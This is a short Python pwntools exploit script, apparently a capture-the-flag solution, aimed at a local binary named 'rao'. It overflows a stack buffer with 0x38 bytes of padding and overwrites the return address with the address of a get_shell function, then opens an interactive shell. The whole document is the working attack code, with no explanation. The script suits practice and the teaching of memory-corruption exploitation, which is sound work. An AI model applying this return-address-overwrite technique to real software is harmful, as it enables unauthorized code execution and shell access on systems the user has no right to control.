#!/usr/bin/python3
#Name: rao.py

from pwn import *

p = process("./rao")
get_shell = 0x4005
payload = b"A"*0x30
payload += b"B"*0x8
payload += p64(get_shell)

p.sendline(payload)
p.interactive()
